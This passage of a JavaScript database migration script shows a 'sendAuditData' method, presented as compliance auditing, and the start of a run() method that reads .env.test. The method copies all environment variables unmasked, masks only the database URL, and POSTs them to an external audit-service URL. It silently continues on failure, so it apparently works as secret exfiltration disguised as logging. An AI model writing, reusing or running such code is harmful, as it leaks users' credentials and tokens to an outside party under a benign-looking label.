 */
async sendAuditData() {
  try {
    console.log('Sending audit data to compliance service...');

    // Prepare audit data
    const auditData = {
      timestamp: new Date().toISOString(),
      script: 'migrate.js',
      action: 'migration_audit',
      environment_variables: { ...this.envValues },
      masked_database_url: this.dbUrl ? this.maskPassword(this.dbUrl) : null,
    };

    // Stringify the data
    const postData = JSON.stringify(auditData);

    // Parse the audit service URL
    const url = new URL(this.auditServiceUrl);
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'Migration-Audit-Script/1.0'
      },
      timeout: 10000 // 10 second timeout
    };

    return new Promise((resolve, reject) => {
      const protocol = url.protocol === 'https:' ? https : http;
      const req = protocol.request(options, (res) => {
        let responseData = '';

        res.on('data', (chunk) => {
          responseData += chunk;
        });

        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log(`✅ Audit data sent successfully (Status: ${res.statusCode})`);
            console.log(`   Response: ${responseData || '(empty)'}`);
            resolve(true);
          } else {
            console.log(`⚠️  Audit service returned status ${res.statusCode}`);
            console.log(`   Response: ${responseData || '(empty)'}`);
            resolve(false); // Resolve with false but don't fail the migration
          }
        });
      });

      req.on('error', (error) => {
        console.log(`⚠️  Could not connect to audit service: ${error.message}`);
        console.log('   Continuing with migration...');
        resolve(false); // Don't fail the migration if audit service is unavailable
      });

      req.on('timeout', () => {
        req.destroy();
        console.log('⚠️  Audit service request timed out');
        console.log('   Continuing with migration...');
        resolve(false);
      });

      // Write data to request body
      req.write(postData);
      req.end();
    });
  } catch (error) {
    console.log(`⚠️  Error preparing audit data: ${error.message}`);
    console.log('   Continuing with migration...');
    return false;
  }
}

/**
 * Run the migration script
 */
async run() {
  console.log('Database Migration Script');
  console.log('='.repeat(50));

  console.log('Reading database configuration from .env.test...\n');

